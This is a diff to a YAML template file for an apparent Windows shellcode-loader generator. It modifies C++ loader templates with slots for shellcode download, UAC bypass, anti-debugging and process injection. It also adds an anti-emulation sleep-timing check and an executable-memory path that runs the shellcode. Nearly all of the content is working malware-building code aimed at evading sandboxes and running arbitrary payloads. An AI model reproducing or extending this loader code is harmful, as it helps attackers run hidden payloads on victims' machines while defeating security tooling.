@@ -3,19 +3,34 @@ templates:
     display: "Default Loader"
     description: "Matches the legacy washmachine layout."
     content: |
-      #include "Win32Helper.h"
+      #ifndef WIN32_LEAN_AND_MEAN
+      #define WIN32_LEAN_AND_MEAN
+      #endif
+      #include <windows.h>
 
       {{PROCESS_LOOKUP_HELPER}}
 
-      INT main(VOID)
-      {
-          {{SHELLCODE_SOURCE}}
+      {{SHELLCODE_SOURCE}}
 
+      extern "C" void* __cdecl memcpy(void* destination, const void* source, size_t count)
+      {
+          unsigned char* dst = static_cast<unsigned char*>(destination);
+          const unsigned char* src = static_cast<const unsigned char*>(source);
+          for (size_t i = 0; i < count; ++i)
+          {
+              dst[i] = src[i];
+          }
+          return destination;
+      }
+
+      static void EntryPoint()
+      {
           {{SHELLCODE_URL}}
 
           {{GUARDRAILS}}
 
           {{ANTI_DEBUGGING}}
+          {{ANTI_EMULATION}}
 
           {{UAC_BYPASS}}
 
@@ -23,8 +38,13 @@ templates:
 
           {{SHELLCODE_EXECUTION}}
 
-          Sleep(1);
-          return 0;
+          ExitProcess(0);
+      }
+
+      extern "C" void __stdcall WinMainCRTStartup()
+      {
+          EntryPoint();
+          ExitProcess(0);
       }
     placeholders:
       - name: "PROCESS_LOOKUP_HELPER"
@@ -39,6 +59,9 @@ templates:
       - name: "ANTI_DEBUGGING"
         kind: snippet
         snippetTemplate: "ANTIDEBUGGING"
+      - name: "ANTI_EMULATION"
+        kind: snippet
+        snippetTemplate: "ANTIEMULATION"
       - name: "UAC_BYPASS"
         kind: snippet
         snippetTemplate: "UACB"
@@ -52,17 +75,35 @@ templates:
     display: "Shellcode Minimal"
     description: "Minimal loader that only sets up the shellcode block and executes it."
     content: |
+      #ifndef WIN32_LEAN_AND_MEAN
       #define WIN32_LEAN_AND_MEAN
+      #endif
       #include <windows.h>
-      //#include "Win32Helper.h"
 
-      INT main(VOID)
+      {{SHELLCODE_SOURCE}}
+
+      extern "C" void* __cdecl memcpy(void* destination, const void* source, size_t count)
       {
-          {{SHELLCODE_SOURCE}}
+          unsigned char* dst = static_cast<unsigned char*>(destination);
+          const unsigned char* src = static_cast<const unsigned char*>(source);
+          for (size_t i = 0; i < count; ++i)
+          {
+              dst[i] = src[i];
+          }
+          return destination;
+      }
 
+      static void EntryPoint()
+      {
           {{SHELLCODE_EXECUTION}}
 
-          return 0;
+          ExitProcess(0);
+      }
+
+      extern "C" void __stdcall WinMainCRTStartup()
+      {
+          EntryPoint();
+          ExitProcess(0);
       }
     placeholders:
       - name: "SHELLCODE_SOURCE"
@@ -95,6 +136,24 @@ sections:
 
           return FALSE;
 
+  - header: "ANTI-EMULATION"
+    template: "ANTIEMULATION"
+    display: "Anti-Emulation"
+    allowMultiple: true
+    items:
+      - id: "AntiEmuSleepTiming"
+        display: "Sleep Timing Verification"
+        snippet: |
+          {
+              DWORD startTick = GetTickCount();
+              Sleep(3000);
+              DWORD elapsed = GetTickCount() - startTick;
+              if (elapsed < 2800)
+              {
+                  return 0;
+              }
+          }
+
   - header: "PROCESS INJECTION"
     template: "PSINJECTION"
     display: "Process Injection"
@@ -110,7 +169,10 @@ sections:
       - id: "MpfProcessInjectionViaProcessReflection"
         display: "MpfProcessInjectionViaProcessReflection"
         snippet: |
-          if (MpfProcessInjectionViaProcessReflection((PBYTE)code_blob,dwSize, GetProcessOrThreadId(L"$psname$", true))) return 1;
+          if (MpfProcessInjectionViaProcessReflection((PBYTE)code_blob, dwSize, GetProcessOrThreadId(L"$psname$", true)))
+          {
+              ExitProcess(1);
+          }
 
   - header: "SHELLCODE EXECUTION"
     template: "SHELLCODEEXECUTION"
@@ -120,22 +182,19 @@ sections:
       - id: "PayloadExecViaFuncPtr"
         display: "Payload Execution Via Function Pointer"
         snippet: |
-              void* executableMemory = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          LPVOID execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+          if (execMem == NULL)
+          {
+              ExitProcess(0);
+          }
 
-              if (executableMemory == NULL) {
-                  return -1;
-              }
+          unsigned char* dst = (unsigned char*)execMem;
+          for (unsigned int i = 0; i < code_blob_len; ++i)
+          {
+              dst[i] = code_blob[i];
+          }
 
-              memcpy(executableMemory, code_blob, code_blob_len);
-
-              DWORD oldProtect;
-              if (!VirtualProtect(executableMemory, code_blob_len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-                  return -1;
-              }
-
-              ((void(*)()) executableMemory)();
-
-              VirtualFree(executableMemory, 0, MEM_RELEASE);
+          ((void(*)())dst)();
 
 
 
@@ -204,7 +263,7 @@ sections:
         snippet: |
           if (GetEnvironmentVariableW(L"__GUARDRAIL_PARAM__", nullptr, 0) == 0)
           {
-              return 0;
+              ExitProcess(0);
           }
 
   - header: "UAC BYPASSES"
